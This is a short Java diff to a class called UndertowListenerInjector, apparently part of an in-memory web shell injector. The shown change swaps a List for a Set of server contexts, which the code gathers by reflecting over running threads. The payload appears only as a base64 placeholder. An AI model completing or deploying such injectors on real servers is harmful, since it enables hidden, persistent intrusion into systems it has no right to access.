@@ -8,6 +8,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
@@ -21,7 +22,7 @@ public class UndertowListenerInjector {
     private String msg = "";
 
     public UndertowListenerInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -67,8 +68,8 @@ public class UndertowListenerInjector {
         return "{{base64Str}}";
     }
 
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             try {
